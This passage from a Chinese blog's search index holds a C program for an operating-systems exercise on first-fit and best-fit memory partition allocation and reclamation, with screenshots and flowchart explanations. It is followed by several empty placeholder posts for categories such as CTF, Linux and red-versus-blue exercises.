punctuation">(</span>ptr<span class="token operator">-&gt;</span>id<span class="token punctuation">,</span> ptr<span class="token operator">-&gt;</span>addr_front<span class="token punctuation">,</span> need<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  assigned<span class="token operator">-&gt;</span>next <span class="token operator">=</span> ptr<span class="token punctuation">;</span>  assigned<span class="token operator">-&gt;</span>front <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>front<span class="token punctuation">;</span>  <span class="token function">changeIdValue</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//把后面的节点的id值都增加1</span>  ptr<span class="token operator">-&gt;</span>addr_front <span class="token operator">+=</span> need<span class="token punctuation">;</span>  ptr<span class="token operator">-&gt;</span>size <span class="token operator">-=</span> need<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment">//空闲区的头不空，就在前一个节点后面添加分配的节点</span>  <span class="token punctuation">{</span>    ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>next <span class="token operator">=</span> assigned<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span><span class="token comment">//空闲节点前没有节点</span>  <span class="token punctuation">{</span>    head <span class="token operator">=</span> assigned<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  ptr<span class="token operator">-&gt;</span>front <span class="token operator">=</span> assigned<span class="token punctuation">;</span><span class="token comment">//空闲节点的头指向新分配的</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">recovery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入需要回收作业的ID号："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> id<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  partion <span class="token operator">*</span>ptr <span class="token operator">=</span> head<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">==</span> ptr<span class="token operator">-&gt;</span>id<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    ptr <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"没有找到你需要回收的作业！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"该ID已经是空闲的了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">//第一个分区</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>next <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment">//后面不空或后面没有</span>      ptr<span class="token operator">-&gt;</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment">//后面空</span>      ptr<span class="token operator">-&gt;</span>size <span class="token operator">+=</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span>      ptr<span class="token operator">-&gt;</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//标记为空闲</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment">//把下一个节点的头指向该节点</span>      <span class="token punctuation">{</span>        ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>front <span class="token operator">=</span> ptr<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      ptr<span class="token operator">-&gt;</span>next <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span><span class="token comment">//合并两个节点</span>      <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//真实释放节点</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>next <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">//最后一个分区</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment">//前面不空或者前没有</span>      ptr<span class="token operator">-&gt;</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment">//前面为空</span>      ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>size <span class="token operator">+=</span> ptr<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span>      ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">//上下都空</span>    ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>size <span class="token operator">+=</span> ptr<span class="token operator">-&gt;</span>size <span class="token operator">+</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span>    ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>next <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>front <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>front<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">changeIdValue</span><span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>next<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//更改id</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">//上空下不空</span>    ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>size <span class="token operator">+=</span> ptr<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span>    ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>next <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>    ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>front <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>front<span class="token punctuation">;</span>    <span class="token function">changeIdValue</span><span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>next<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">//上不空下空</span>    ptr<span class="token operator">-&gt;</span>size <span class="token operator">+=</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>front <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    partion <span class="token operator">*</span>p_next <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token comment">//保存一下下方为空的那个分区，以便一会释放 </span>    ptr<span class="token operator">-&gt;</span>next <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>    ptr<span class="token operator">-&gt;</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">changeIdValue</span><span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p_next<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>front<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> ptr<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">//上下都不空</span>    ptr<span class="token operator">-&gt;</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">changeIdValue</span><span class="token punctuation">(</span>partion <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> delta<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    ptr<span class="token operator">-&gt;</span>id <span class="token operator">+=</span> delta<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-运行截图"><a href="#4-运行截图" class="headerlink" title="4.运行截图"></a>4.运行截图</h1><p>首次适应算法<br>开始<br><img src="https://img-blog.csdnimg.cn/fcb17327ab0d430b86a1c4c2f3234812.png" alt="在这里插入图片描述"><br>（1）作业1 申请130 KB<br><img src="https://img-blog.csdnimg.cn/4bdc7d552f1b49a98cff15009a34ceb6.png" alt="在这里插入图片描述"></p><p>（2）作业2 申请60 KB<br><img src="https://img-blog.csdnimg.cn/aef238e2bf574a3d934ff66633b772fc.png" alt="在这里插入图片描述"></p><p>（3）作业3 申请100 KB<br><img src="https://img-blog.csdnimg.cn/e6f05c87f7b0423eb43cd4d55dce6773.png" alt="在这里插入图片描述"></p><p>（4）作业2 释放60 KB<br><img src="https://img-blog.csdnimg.cn/7e9f582a2cbf4b8b815813bb84affe0a.png" alt="在这里插入图片描述"></p><p>（5）作业3 释放100 KB<br><img src="https://img-blog.csdnimg.cn/f547f14756284619ba37a759a1edd81d.png" alt="在这里插入图片描述"></p><p>（6）作业1 释放130 KB</p><p><img src="https://img-blog.csdnimg.cn/fe5867fae214433d868b300ffc01bbad.png" alt="在这里插入图片描述"></p><p>最佳适应算法<br>开始：<br><img src="https://img-blog.csdnimg.cn/586d71f7428a43f180400d4212914938.png" alt="在这里插入图片描述"></p><p>（1）作业1 申请130 KB<br><img src="https://img-blog.csdnimg.cn/0cac0760d9da40d4a6cfeb60bde49878.png" alt="在这里插入图片描述"></p><p>（2）作业2 申请60 KB<br><img src="https://img-blog.csdnimg.cn/bf71cca8e17b44c89d84122259b1285b.png" alt="在这里插入图片描述"></p><p>（3）作业3 申请100 KB<br><img src="https://img-blog.csdnimg.cn/41a2e81d15b24215919c40a5532eb619.png" alt="在这里插入图片描述"></p><p>（4）作业2 释放60 KB<br><img src="https://img-blog.csdnimg.cn/93c561a256684af4a5a01d3feceb6495.png" alt="在这里插入图片描述"></p><p>（5）作业3 释放100 KB<br><img src="https://img-blog.csdnimg.cn/10b407c46e654f9dbe4b8642e317a9fa.png" alt="在这里插入图片描述"></p><p>（6）作业1 释放130 KB<br><img src="https://img-blog.csdnimg.cn/54bdc2c9ab4143e294e054aa66d43a9c.png" alt="在这里插入图片描述"></p><h1 id="5-程序说明"><a href="#5-程序说明" class="headerlink" title="5.程序说明"></a>5.程序说明</h1><p>总流程图：<br><img src="https://img-blog.csdnimg.cn/7a8681fc296a414aa027f4949091e5d1.png" alt="在这里插入图片描述"></p><p>总流程图是提供程序开始运行的界面图，供用户选择，其中用户可以选择的选项有，首次适应算法，最佳适应算法，内存回收，内存作业的显示。每选择一个功能就执行相应的函数代码。</p><p>首次适应算法流程图：<br><img src="https://img-blog.csdnimg.cn/3ddb1c3129df48709c31d5b1da236c0d.png" alt="在这里插入图片描述"></p><p>首次适应算法，首先用户输入作业需要的内存大小，然后程序从低地址向高地址寻找空间空间，如果找到空闲空间，如果空闲空间的大小比作业需要的空间大则进行分配，如果空闲空间比作业需要的空间小，则继续寻找下一个空闲空间。如果所有的空闲空间都寻找完也没有符合要求的，那么作业的内存分配失败。</p><p>最佳适应算法流程图<br><img src="https://img-blog.csdnimg.cn/193e3580bd5643cb97e5980ed7db801b.png" alt="在这里插入图片描述"></p><p>最佳适应算法，首页用户输入作业需要的内存空间，程序从低地址开始寻找空闲空间，如果第一次找合适的空间分配，就临时存储这个空间地址，继续向下继续寻找符合的地址空间，如果寻找到合适的空间空间范围，且新的空间大小比临时存储的空间大小还小，则新的符合空间更新为临时符合空间，依次类推到最后。如果程序没有临时最佳的地址空间，则并没有分配到内存，所以作业内存分配失败。如果有临时最佳空间地址，则把最佳的地址空间分配给作业。</p><p>内存回收流程图：<br><img src="https://img-blog.csdnimg.cn/9609cfb69f8b4e3fb6df405aec5913e1.png" alt="在这里插入图片描述"></p><p>作业回收，首先需要需要输入回收作业的ID，先判断作业ID是否存在，存在才能进行释放，在ID存在的前提下判断，该ID的作业状态，只有为已分配状态猜才进行释放。释放则的分情况讨论。释放的节点分为头部，中间，尾部。如果释放的节点前后已经有空闲空间，就需要进行合并。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阅读测试</title>
      <link href="/posts/56380.html"/>
      <url>/posts/56380.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-这是阅读分类下的文章"><a href="#1-这是阅读分类下的文章" class="headerlink" title="1.这是阅读分类下的文章"></a>1.这是阅读分类下的文章</h2><h2 id="《如何阅读一本书》"><a href="#《如何阅读一本书》" class="headerlink" title="《如何阅读一本书》"></a>《如何阅读一本书》</h2><h3 id="书本信息"><a href="#书本信息" class="headerlink" title="书本信息"></a>书本信息</h3><blockquote><p>作者：</p></blockquote><h3 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h3>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编成学习 </tag>
            
            <tag> 项目经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF分类测试</title>
      <link href="/posts/53480.html"/>
      <url>/posts/53480.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-这是CTF分类下的文章"><a href="#1-这是CTF分类下的文章" class="headerlink" title="1.这是CTF分类下的文章"></a>1.这是CTF分类下的文章</h2>]]></content>
      
      
      <categories>
          
          <category> CTF练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平常联系 </tag>
            
            <tag> 编成学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux分类测试</title>
      <link href="/posts/15209.html"/>
      <url>/posts/15209.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-这是Linux分类下的文章"><a href="#1-这是Linux分类下的文章" class="headerlink" title="1.这是Linux分类下的文章"></a>1.这是Linux分类下的文章</h2>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编成学习 </tag>
            
            <tag> 项目经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++分类测试</title>
      <link href="/posts/33284.html"/>
      <url>/posts/33284.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-这是C-分类下的文章"><a href="#1-这是C-分类下的文章" class="headerlink" title="1.这是C++分类下的文章"></a>1.这是C++分类下的文章</h2>]]></content>
      
      
      <categories>
          
          <category> 与C相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编成学习 </tag>
            
            <tag> 项目经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python分类测试</title>
      <link href="/posts/41756.html"/>
      <url>/posts/41756.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-这是C-分类下的文章"><a href="#1-这是C-分类下的文章" class="headerlink" title="1.这是C#分类下的文章"></a>1.这是C#分类下的文章</h2>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编成学习 </tag>
            
            <tag> 项目经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红蓝对抗测试</title>
      <link href="/posts/58351.html"/>
      <url>/posts/58351.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-这是红蓝对抗分类下的文章"><a href="#1-这是红蓝对抗分类下的文章" class="headerlink" title="1.这是红蓝对抗分类下的文章"></a>1.这是红蓝对抗分类下的文章</h2>]]></content>
      
      
      <categories>
          
          <category> 红蓝对抗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编成学习 </tag>
            
            <tag> 项目经历 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
